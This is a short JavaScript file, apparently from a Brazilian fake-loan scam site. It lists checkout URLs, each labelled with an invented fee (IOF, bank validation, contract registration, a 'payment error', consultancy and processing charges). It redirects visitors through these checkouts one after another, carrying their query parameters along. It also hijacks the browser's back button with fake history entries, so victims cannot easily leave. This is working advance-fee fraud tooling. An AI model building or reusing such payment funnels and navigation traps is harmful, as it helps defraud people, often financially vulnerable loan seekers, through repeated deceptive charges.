   const baseLinks = {
  up1: "https://pay.app-agil.online/PyE2Zy8MKb23qRb", // IOF
  up2: "https://checkout.agilatendimento.store/VCCL1O8SC8V1", // Validação Bancaria
  up3: "https://checkout.agilatendimento.store/VCCL1O8SC8X0", // Seguro Prestamista "tarifa de cadastro"
  up4: "https://checkout.agilatendimento.store/VCCL1O8SC8X3", // NFe
  up5: "https://checkout.agilatendimento.store/VCCL1O8SC8X4", // Ativar conta
  up6: "https://checkout.agilatendimento.store/VCCL1O8SC8X5", // Taxa de registro do contrato
  up7: "https://checkout.agilatendimento.store/VCCL1O8SC8X6", // ParabÃ©ns, 20k adicional
  up8: "https://checkout.agilatendimento.store/VCCL1O8SC8X7", // Erro no pagamento - 14,06
  up9: "https://checkout.agilatendimento.store/VCCL1O8SC8X8", // APP - 11,99
  up10: "https://checkout.agilatendimento.store/VCCL1O8SC8X9", // Taxa de Abertura TAC - 16,92
  up11: "https://checkout.agilatendimento.store/VCCL1O8SC8XA", // Taxa de Consultoria Financeira - 19,53
  up12: "https://google.com", // Taxa de Processamento Administrativo - 31,92
};

function redirect(key) {
  try {
    if (!baseLinks[key]) {
      throw new Error(`Link para ${key} não encontrado!`);
    }

    const url = new URL(baseLinks[key]);
    url.search = new URLSearchParams(window.location.search).toString();

    window.location.href = url.href;
  } catch (error) {
    console.error("Erro no redirecionamento:", error);
    alert(`Erro: ${error.message || "Não foi possível redirecionar"}`);
  }
}


const backRedirectBackLink = "/back";

// Adiciona duas entradas no histÃ³rico para capturar a navegaÃ§Ã£o para trÃ¡s
history.pushState({}, "", location.href);
history.pushState({}, "", location.href);

// Captura o evento de navegaÃ§Ã£o para trÃ¡s e redireciona
window.onpopstate = function () {
  setTimeout(() => {
    location.href = backRedirectBackLink;
  }, 1);
};
